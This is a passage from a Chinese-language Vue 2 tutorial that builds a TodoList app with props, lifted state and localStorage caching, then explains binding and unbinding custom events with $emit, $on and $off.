margin-top: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nTodoMain里的TodoItem：\n\n<template>\n  <li>\n    <label>\n      <input type="checkbox" />\n      <span>xxxxx</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n};\n<\/script>\n\n<style scoped>\n/*item*/\nli {\n  list-style: none;\n  height: 36px;\n  line-height: 36px;\n  padding: 0 5px;\n  border-bottom: 1px solid #ddd;\n}\nli label {\n  float: left;\n  cursor: pointer;\n}\nli label li input {\n  vertical-align: middle;\n  margin-right: 6px;\n  position: relative;\n  top: -1px;\n}\nli button {\n  float: right;\n  display: none;\n  margin-top: 3px;\n}\nli:before {\n  content: initial;\n}\nli:last-child {\n  border-bottom: none;\n}\nli:hover {\n  background-color: #ddd;\n}\nli:hover button {\n  display: block;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n\n# 4.2 初始化操作-列表渲染\n\n初始化列表，首先在data里构造一个数组todos，每一项存储id编号、title名称、done是否完成；然后使用v-for对todos进行遍历来构造展示todo列表，在<TodoItem>里使用v-for="todo in todos"，不要忘记加上:key="todo.id"；再就是要给TodoItem子组件进行传参，准备一个属性todoItem，并动态绑定单项数据，即:todoItem="todo"；最后TodoItem要接收父组件传来的数据，使用props: [\'todoItem\']。\n\nTodoMain.vue：\n\n<template>\n  <ul class="todo-main">\n    <TodoItem v-for="todo in todos" :key="todo.id" :todoItem="todo"></TodoItem>\n  </ul>\n</template>\n\n<script>\nimport TodoItem from "./TodoItem.vue";\nexport default {\n  name: "TodoMain",\n  components: { TodoItem },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nTodoItem.vue接收数据，并可以对checkbox和span绑定值：\n\n<template>\n  <li>\n    <label>\n      <input type="checkbox" :checked="todoItem.done" />\n      <span>{{ todoItem.title }}</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n  props: ["todoItem"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 4.3 添加操作-状态提升\n\n前一小节todos数据是存放在TodoMain里进行列表渲染，而这一小节要开发AddTodo组件的添加item功能，这样就会用到todos数据。这两个平级的组件都会读取或修改todos数据，那就涉及到组件间通信了。\n\n在前面章节里只说过父组件向子组件传参使用props方式，这是一种父到子的单向通信。而这一小节主要讲一个最简单的组件间通信（双向），它就是状态提升。其实在后面章节里会讲全局事件总线和vuex等高级的组件间通信技术，但这是后话了。\n\n所谓的状态提升，就是将多个子组件的共用数据提升到父组件里。如果哪个子组件想读取数据了（为了展示渲染），就通过props方式将需要的数据传递给子组件（父===>子）；重点来了，如果哪个子组件想操作数据了（为了修改父组件里的原始数据），就将定义在父组件里的“操作数据的方法”，通过props方式将该方法的引用来传递给子组件，那么子组件手握该方法引用并可以调用它去修改父组件里的原始数据了（子===>父）。\n\n按照状态提升，我们假设A组件修改了父组件里的存储数据，并且该数据在之前就通过porps方式传给了B组件，那么该数据被A修改B就会重新读取（至于B为什么重新读取，可以看3.4 props数据流向这一节内容）。这样的情景反过来，B修改数据那A也会重新读取，这就达到了A与B进行了双向通信的目的。父组件充当了子组件双向通信的一个桥梁。\n\n我们要对上一小节的代码做简单的修改，将todos数据存到App这个父组件里，子组件TodoMain通过props配置接收传来的todos数据。还有，父组件App要提前将修改数据的方法通过props传递给AddTodo。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    \x3c!-- 要给AddTodo提供修改todos数据的方法 --\x3e\n    <AddTodo :addTodo="addTodo"></AddTodo>\n    \x3c!-- 要将todos数据传给TodoMain进行展示 --\x3e\n    <TodoMain :todos="todos"></TodoMain>\n    <TotalTodo></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  data() {\n    return {\n      // 初始化todos数组，状态提升，将数据放到两个组件的父组件里，通过父组件这个桥梁进行通信\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    // 通过props的方式将addTodo方法暴露给AddTodo去使用，是为了修改todos数据\n    addTodo(item) {\n      // unshift方法可以触发模板重新解析\n      this.todos.unshift(item);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nTodoMain.vue：\n\n<template>\n  <ul class="todo-main">\n    \x3c!-- 使用App传来的todos数组 --\x3e\n    <TodoItem v-for="todo in todos" :key="todo.id" :todoItem="todo"></TodoItem>\n  </ul>\n</template>\n\n<script>\nimport TodoItem from "./TodoItem.vue";\nexport default {\n  name: "TodoMain",\n  components: { TodoItem },\n  // 接收App传来的todos数组\n  props: ["todos"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nAddTodo.vue：\n\n<template>\n  <div class="todo-header">\n    <input\n      type="text"\n      placeholder="请输入你的任务名称，按回车键确认"\n      v-model.trim="title"\n      @keyup.enter="addItem"\n    />\n  </div>\n</template>\n\n<script>\nimport { nanoid } from "nanoid";\nexport default {\n  name: "AddTodo",\n  // 接收App传来的addTodo，用于修改App里的todos数组\n  props: ["addTodo"],\n  data() {\n    return {\n      title: "",\n    };\n  },\n  methods: {\n    addItem() {\n      if (!this.title) return;\n      // 使用nanoid库生成一个唯一id\n      const item = { id: nanoid(), title: this.title, done: false };\n      // 使用App传来的addTodo，用于修改App里的todos数组（新增一项）\n      this.addTodo(item);\n      this.title = "";\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 4.4 勾选和删除\n\n在3.4 props配置项这节里，说过props是只读的，但它是对象时，其实能成功修改它的属性值。我们可以利用props这个漏洞搭配v-model，快速实现TodoItem组件里的checkbox动态响应（勾上or取消，对应数据也改变）。\n\n<template>\n  <li>\n    <label>\n      \x3c!-- 利用`props`和v-model实现勾选框与数据之间的动态响应 --\x3e\n      <input type="checkbox" v-model="todoItem.done" />\n      <span>{{ todoItem.title }}</span>\n    </label>\n    <button class="btn btn-danger">删除</button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n  props: ["todoItem"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n可以看到上面就用了一行代码就达到了勾选框与数据之间的动态响应，确实是非常方便。但这违背了props只读的原则，那么就只能用上一小节的状态提升来实现了。在使用状态提升实现item的勾选时我们顺带实现一下删除。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    <AddTodo :addTodo="addTodo"></AddTodo>\n    \x3c!-- 通过props将方法传递给子组件 --\x3e\n    <TodoMain\n      :todos="todos"\n      :checkTodo="checkTodo"\n      :deleteTodo="deleteTodo"\n    ></TodoMain>\n    <TotalTodo></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    // 给TodoItem提供的方法，用于修改done字段\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 给TodoItem提供的方法，用于删除一项\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nTodoMain.vue：\n\n<template>\n  <ul class="todo-main">\n    <TodoItem\n      v-for="todo in todos"\n      :key="todo.id"\n      :todoItem="todo"\n      :checkTodo="checkTodo"\n      :deleteTodo="deleteTodo"\n    ></TodoItem>\n  </ul>\n</template>\n\n<script>\nimport TodoItem from "./TodoItem.vue";\nexport default {\n  name: "TodoMain",\n  components: { TodoItem },\n  props: ["todos", "checkTodo", "deleteTodo"],\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nTodoItem.vue：\n\n<template>\n  <li>\n    <label>\n      <input\n        type="checkbox"\n        :checked="todoItem.done"\n        @change="handleCheck(todoItem.id)"\n      />\n      <span>{{ todoItem.title }}</span>\n    </label>\n    <button class="btn btn-danger" @click="handleDelete(todoItem.id)">\n      删除\n    </button>\n  </li>\n</template>\n\n<script>\nexport default {\n  name: "TodoItem",\n  props: ["todoItem", "checkTodo", "deleteTodo"],\n  methods: {\n    handleCheck(id) {\n      if (!id) return;\n      // 调用App传来的方法，勾选某一项\n      this.checkTodo(id);\n    },\n    handleDelete(id) {\n      if (!id) return;\n      if (confirm("确实删除吗？")) {\n        // 调用App传来的方法，删除某一项\n        this.deleteTodo(id);\n      }\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 4.5 底部统计\n\n这一节要完成“全部todo数量统计”、“已完成todo数量统计”、“全部或取消全部勾选todo”、“清除已完成的todo”。前两个需求可以使用计算属性，第三个需求可以使用:checked和@change来完成，最后一个需求更简单直接让父组件的数据过滤。\n\nApp.vue：\n\n<template>\n  <div class="todo-container">\n    <AddTodo :addTodo="addTodo"></AddTodo>\n    <TodoMain\n      :todos="todos"\n      :checkTodo="checkTodo"\n      :deleteTodo="deleteTodo"\n    ></TodoMain>\n    \x3c!-- 将checkAllTodo和clearAllTodo传递给TotalTodo使用 --\x3e\n    <TotalTodo\n      :todos="todos"\n      :checkAllTodo="checkAllTodo"\n      :clearAllTodo="clearAllTodo"\n    ></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  data() {\n    return {\n      todos: [\n        { id: "001", title: "吃饭", done: true },\n        { id: "002", title: "学习", done: false },\n        { id: "003", title: "游戏", done: false },\n      ],\n    };\n  },\n  methods: {\n    // 上两节内容\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    // 上一节内容\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    // 上一节内容\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    // 这一节内容，勾选全部todo或者取消勾选全部todo\n    checkAllTodo(done) {\n      this.todos.forEach((item) => (item.done = done));\n    },\n    // 这一节内容，清除已完成的todo\n    clearAllTodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nTotalTodo.vue：\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" :checked="isAll" @change="checkAll" />\n    </label>\n    <span>\n      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "TotalTodo",\n  props: ["todos", "checkAllTodo", "clearAllTodo"],\n  computed: {\n    // 计算出全部todo的数量\n    total() {\n      return this.todos.length;\n    },\n    // 计算出已完成的todo的数量\n    doneTotal() {\n      // 使用reduce进行统计，accumulator是累计器，currItem是当前操作的项\n      const count = this.todos.reduce((accumulator, currItem) => {\n        // 只要当前操作的项是已完成的todo，将让累计器加1\n        return accumulator + (currItem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    // 判断是否全部勾选\n    isAll() {\n      return this.total > 0 && this.total === this.doneTotal;\n    },\n  },\n  methods: {\n    checkAll(e) {\n    // 去修改App里的todos所有项的done字段，全部勾选or全部取消\n      this.checkAllTodo(e.target.checked);\n    },\n    clearAll() {\n    // 清空App里的todos已完成的todo\n      this.clearAllTodo();\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n其实上面TotalTodo.vue的checkbox还有优化的余地，让它勾选的初识化状态与change事件进行合并，也就是让v-model搭配计算属性的getter/setter。在checkbox初始化时，走计算属性isAll的getter；当checkbox勾选或取消勾选时，走计算属性isAll的setter。\n\n<template>\n  <div class="todo-footer" v-show="total">\n    <label>\n      <input type="checkbox" v-model="isAll" />\n    </label>\n    <span>\n      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}\n    </span>\n    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "TotalTodo",\n  props: ["todos", "checkAllTodo", "clearAllTodo"],\n  computed: {\n    total() {\n      return this.todos.length;\n    },\n    doneTotal() {\n      const count = this.todos.reduce((accumulator, currItem) => {\n        return accumulator + (currItem.done ? 1 : 0);\n      }, 0);\n      return count;\n    },\n    // 计算属性isAll搭配v-model，让checkbox初始化时走getter，值变化时让App里的所有todo都勾选or取消勾选上\n    isAll: {\n      get() {\n        return this.total > 0 && this.total === this.doneTotal;\n      },\n      set(val) {\n        this.checkAllTodo(val);\n      },\n    },\n  },\n  methods: {\n    clearAll() {\n      this.clearAllTodo();\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 组件化编码流程：\n    1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。\n    2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用。\n       * 一个组件在用：放在组件自身即可。\n       * 一些组件在用：放在它们共同的父组件上。（状态提升）\n    3. 实现交互：从绑定事件开始。\n 2. props适用于：\n    1. 父组件===>子组件 通信\n    2. 子组件===>父组件 通信（要求父组件先给子组件传一个函数，修改数据）\n 3. 使用v-model时要切记：v-model绑定的值不能是props传递过来的值，因为props是只读的。\n 4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。\n\n----------------------------------------\n\n\n# 4.6 TodoList本地缓存\n\n浏览器缓存有localStorage和sessionStorage，它们大概支持5M大小的内容。一直存在的缓存是localStorage，浏览器关闭后清除缓存的是sessionStorage。它们的API是一样的：setItem()新增或修改一条、getItem()读取一条、removeItem()删除一条、clear()清空所有。特别注意，setItem()在存储非字符串数据时，会自动将它转为字符串，如果要存对象类型的数据，先手动使用JSON.stringify(obj)进行转换。\n\n关于localStorage：\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n</head>\n<body>\n    <h2>localStorage</h2>\n    <button onclick="saveData()">保存一份localStorage</button>\n    <button onclick="readData()">读取一份localStorage</button>\n    <button onclick="deleteData()">删除一份localStorage</button>\n    <button onclick="deleteAllData()">清空所有localStorage</button>\n    <script type="text/javascript">\n        function saveData() {\n            // 添加or修改一条localStorage\n            localStorage.setItem(\'name\', \'张三\');\n            localStorage.setItem(\'age\', 18);\n            const person = { name: \'李四\', age: 20 }\n            // 对象要先转成json字符串，因为setItem会将非字符串的值转为字符串\n            localStorage.setItem(\'person\', JSON.stringify(person));\n        }\n        function readData() {\n            // 读取一条localStorage\n            console.log(\'name：\', localStorage.getItem(\'name\'));\n            console.log(\'age：\', localStorage.getItem(\'age\'));\n            const result = localStorage.getItem(\'person\')\n            // 将json字符串转为对象\n            console.log(\'person：\', JSON.parse(result));\n        }\n        function deleteData() {\n            // 移除一条localStorage\n            localStorage.removeItem(\'name\');\n        }\n        function deleteAllData() {\n            // 清空所有localStorage\n            localStorage.clear();\n        }\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n在前面几节的todolist，每次刷新页面，数据都是固定写死的。我们可以使用localStorage或sessionStorage进行浏览器缓存，在todolist我们需要使用监视属性对todos进行监视。\n\n<template>\n  <div class="todo-container">\n    <AddTodo :addTodo="addTodo"></AddTodo>\n    <TodoMain\n      :todos="todos"\n      :checkTodo="checkTodo"\n      :deleteTodo="deleteTodo"\n    ></TodoMain>\n    <TotalTodo\n      :todos="todos"\n      :checkAllTodo="checkAllTodo"\n      :clearAllTodo="clearAllTodo"\n    ></TotalTodo>\n  </div>\n</template>\n\n<script>\nimport AddTodo from "./components/AddTodo.vue";\nimport TodoMain from "./components/TodoMain.vue";\nimport TotalTodo from "./components/TotalTodo.vue";\n\nexport default {\n  name: "App",\n  components: {\n    AddTodo,\n    TodoMain,\n    TotalTodo,\n  },\n  data() {\n    return {\n      // 初始化时读取localStorage，没读取到就用[]\n      todos: JSON.parse(localStorage.getItem("todos")) || [],\n    };\n  },\n  watch: {\n    todos: {\n      // 开启深度监视，能监视到done字段\n      deep: true,\n      handler(value) {\n        // todos数据变化时，将新数据存储到localStorage里\n        const jsonStr = JSON.stringify(value);\n        localStorage.setItem("todos", jsonStr);\n      },\n    },\n  },\n  methods: {\n    addTodo(item) {\n      this.todos.unshift(item);\n    },\n    checkTodo(id) {\n      if (!id) return;\n      for (let i = 0; i < this.todos.length; i++) {\n        const item = this.todos[i];\n        if (item.id === id) {\n          item.done = !item.done;\n          break;\n        }\n      }\n    },\n    deleteTodo(id) {\n      if (!id) return;\n      this.todos = this.todos.filter((item) => item.id !== id);\n    },\n    checkAllTodo(done) {\n      this.todos.forEach((item) => (item.done = done));\n    },\n    clearAllTodo() {\n      this.todos = this.todos.filter((item) => !item.done);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# 五、自定义事件和全局事件总线\n\n\n# 5.1 绑定自定义事件\n\n在上一章里，我们使用了状态提升来让平级的组件进行通信。其中有一个重要环节，那就是子组件访问父组件。具体的，父组件通过props传递给子组件一个函数（传的是引用，函数本身还存在于父组件），在需要进行子组件访问父组件时，子组件内部就调用该函数（携带新数据），以达到子组件访问父组件的目的（子组件调用该函数时，将新数据传递给了该函数本身所在的父组件）。\n\n这个重要环节最核心的就是那个传递的“函数”，其实我们可以用“自定义事件”来替代这一步骤。不用传递函数，只需要在绑定自定义事件时把事件回调函数留给父组件，然后让子组件内部去触发事件（触发后，底层会调用回调函数），这就能达到子组件访问父组件的目的（触发时携带新数据，通过事件回调函数传递给父组件）。\n\n具体的，我们在父组件中给子组件标签里，使用v-on来绑定自定义事件，该事件的回调函数写在父组件的methods里，在子组件想访问（修改）父组件的存储数据时，让子组件内部使用$emit去触发那个自定义事件，那么父组件里的那个回调函数就会被调用（达到子访问父的目的）。\n\nApp.vue：\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    \x3c!-- School组件仍然使用状态提升 --\x3e\n    <School :schoolChange="schoolChange" />\n    \x3c!-- Student组件使用绑定自定义事件 --\x3e\n    <Student @changeInfo="studentChange" />\n  </div>\n</template>\n\n<script>\nimport School from "./components/School.vue";\nimport Student from "./components/Student.vue";\nexport default {\n  name: "App",\n  components: {\n    School,\n    Student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    // 回调函数，给School使用\n    schoolChange(info) {\n      this.info = info;\n    },\n    // 回调函数，给Student使用\n    studentChange(info) {\n      this.info = info;\n    },\n  },\n};\n<\/script>\n\n<style>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nSchool.vue：\n\n<template>\n  <div class="school">\n    <h2>学校：{{ name }}</h2>\n    <h2>地址：{{ address }}</h2>\n    <button @click="showInfo">点击我，修改父组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "School",\n  // 状态提升，props需要接收schoolChange回调函数\n  props: ["schoolChange"],\n  data() {\n    return {\n      name: "武汉大学",\n      address: "武汉市武昌区珞珈山路",\n    };\n  },\n  methods: {\n    showInfo() {\n      // 调用schoolChange这个回调函数\n      this.schoolChange("这里被School子组件修改了");\n    },\n  },\n};\n<\/script>\n\n<style scoped>\n.school {\n  padding: 20px;\n  margin: 20px;\n  background-color: forestgreen;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nStudent.vue：\n\n<template>\n  <div class="student">\n    <h2>姓名：{{ name }}</h2>\n    <h2>年龄：{{ age }}</h2>\n    <button @click="showInfo">点击我，修改父组件展示信息</button>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Student",\n  data() {\n    return {\n      name: "张三",\n      age: 18,\n    };\n  },\n  methods: {\n    showInfo() {\n      // 并没有使用props接收函数。只是在这里触发自定义事件，父组件那边的回调函数会被调用，还能携带新数据\n      this.$emit("changeInfo", "这里被Student子组件修改了");\n    },\n  },\n};\n<\/script>\n\n<style scoped>\n.student {\n  padding: 20px;\n  margin: 20px;\n  background-color: hotpink;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n这种方式简单来说就是，外部绑定事件，内部触发事件；触发时是携带了新数据，将新数据传递给了定义在外部的回调函数（事件内部运行机制）。这种方式不需要通过props进行函数的传递（即子组件也无需使用props接收），这比之前的方式更简便。\n\n绑定自定义事件除了上面这种@xxx写法，其实还有另一种写法，使用ref特殊属性标记子组件，然后在父组件mounted生命钩子里获取这个子组件实例，再使用子组件实例.$on(事件名, 回调函数)来绑定自定义事件。第二种写法会比较灵活，可以在异步操作之后绑定自定义事件。\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    <School :schoolChange="schoolChange" />\n    \x3c!-- 使用ref特殊属性进行标记，对子组件使用ref，获取的就是子组件实例vc --\x3e\n    <Student ref="student" />\n  </div>\n</template>\n\n<script>\nimport School from "./components/School.vue";\nimport Student from "./components/Student.vue";\nexport default {\n  name: "App",\n  components: {\n    School,\n    Student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    schoolChange(info) {\n      this.info = info;\n    },\n    studentChange(info) {\n      this.info = info;\n    },\n  },\n  mounted() {\n    // 先通过ref获取到子组件的实例对象，再给子组件实例对象绑定自定义事件\n    this.$refs.student.$on("changeInfo", this.studentChange);\n  },\n};\n<\/script>\n\n<style>\n.outer {\n  padding: 10px;\n  background-color: dimgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 5.2 解绑自定义事件\n\n在组件进行销毁（this.$destroy()）或者它的父组件进行销毁时，其组件里绑定的自定义事件会被删除，尽管这样有时候还是需要进行手动解绑自定义事件。\n\n<template>\n  <div class="outer">\n    <h2>父组件展示信息：{{ info }}</h2>\n    <School ref="school" />\n    <Student ref="student" />\n    <button @click="offInfoSchEvent">解绑changeInfoSch自定义事件</button\n    ><br /><br />\n    <button @click="offInfoStuEvent">解绑changeInfoStu自定义事件</button>\n  </div>\n</template>\n\n<script>\nimport School from "./components/School.vue";\nimport Student from "./components/Student.vue";\nexport default {\n  name: "App",\n  components: {\n    School,\n    Student,\n  },\n  data() {\n    return { info: "还未有人修改这里" };\n  },\n  methods: {\n    schoolChange(info) {\n      this.info = info;\n    },\n    studentChange(info) {\n      this.info = info;\n    },\n    offInfoSchEvent() {\n      // 解绑自定义事件changeInfoSch\n      this.$refs.school.$off("changeInfoSch");\n      // 同时解绑多个，解绑school里的xxx事件和yyy事件\n      // this.$refs.school.$off([\'xxx\', \'yyy\']);\n      // 同时解绑所有的，解绑school里的所有自定义事件\n      // this.$refs.school.$off();\n    },\n    offInfoStuEvent() {\n      // 解绑自定义事件changeInfoStu\n      this.$refs.student.$off("changeInfoStu");\n      // 同时解绑多个，解绑student里的xxx事件和yyy事件\n      // this.$refs.student.$off([\'xxx\', \'yyy\']);\n      // 同时解绑所有的，解绑student里的所有自定义事件\n      // this.$refs.student.$off();\n    },\n  },\n  mounted() {\n    // 给school绑定changeInfoSch自定义事件\n    this.$refs.school.$on("changeInfoSch", this.schoolChange);\n    // 给student绑定changeInfoStu自定义事件\n    this.$refs.student.$on("changeInfoStu", this.studentChange);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 5.3 自定义事件注意点\n\n对子组件进行自定义事件的绑定，那自定义事件的回调函数一般写在父组件的methods里。如果使用this.$refs.xxx.$on(\'yyy\', function(){})，也就是将回调函数直接定义在了第二个参数里，那这个回调函数的this会指向子组件实例，因为是子组件触发的自定义事件。想要与methods方式一样，让this指向父组件实例，那么可以让第二个参数使用箭头函数。\n\n  mounted() {\n    // 给school绑定changeInfoSch自定义事件\n    this.$refs.school.$on("changeInfoSch", (info) => {\n      this.info = info;\n    });\n    // 给student绑定changeInfoStu自定义事件\n    this.$refs.student.$on("changeInfoStu", (info) => {\n      this.info = info;\n    });\n  },\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n如果在父组件里给子组件标签里使用v-on来绑定原生事件（前面都是绑定自定义事件），Vue会认为你绑定的就是自定义事件。要解决这个问题，需要加上事件修饰符.native，让Vue将这个事件绑定到子组件模板里的那个根元素上。\n\n<template>\n  